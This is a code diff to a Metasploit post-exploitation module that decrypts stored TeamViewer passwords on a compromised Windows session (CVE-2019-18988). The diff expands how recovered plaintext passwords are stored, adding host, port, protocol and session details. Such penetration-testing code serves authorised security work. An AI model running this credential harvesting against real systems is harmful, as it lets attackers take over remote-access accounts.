@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Post
         'Description'   => %q{ This module will find and decrypt stored TeamViewer passwords },
         'License'       => MSF_LICENSE,
         'References'    => [ ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'] ],
-        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>'],
+        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>' ],
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
@@ -56,7 +56,22 @@ class MetasploitModule < Msf::Post
         next if plaintext.nil?
         print_good("Found #{location[:description]}: #{plaintext}")
         results << "#{location[:description]}: #{plaintext}\n"
-        store_valid_credential(user:nil, private: plaintext, private_type: :password, service_data: {last_attempted_at: nil, origin_type: :session, service_name: 'teamviewer', status: Metasploit::Model::Login::Status::UNTRIED})
+        store_valid_credential(
+          user: nil,
+          private: plaintext,
+          private_type: :password,
+          service_data: {
+            address: session.session_host,
+            last_attempted_at: nil,
+            origin_type: :session,
+            port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139
+            post_reference_name: self.refname,
+            protocol: 'tcp',
+            service_name: 'teamviewer',
+            session_id: session_db_id,
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }
+        )
       end
     end
 
